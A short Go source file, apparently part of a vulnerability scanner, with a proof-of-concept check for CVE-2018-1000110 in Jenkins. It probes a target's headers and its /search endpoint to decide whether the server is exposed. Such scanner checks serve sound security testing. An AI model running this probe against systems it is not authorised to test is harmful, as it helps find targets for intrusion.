package jenkins

import (
	"github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"
	"strings"
)

func CVE_2018_1000110(u string, client *httpx.Client) bool {
	if req, err := client.Request(u, "GET", "", nil, "Poc Jenkins"); err == nil {
		if req.RespHeader.Get("X-Jenkins-Session") != "" {
			if req2, err := client.Request(u+"/search/?q=a", "GET", "", nil, "Poc Jenkins"); err == nil {
				if strings.Contains(req2.Body, "Search for 'a'") {
					return true
				}
			}
		}
	}
	return false
}
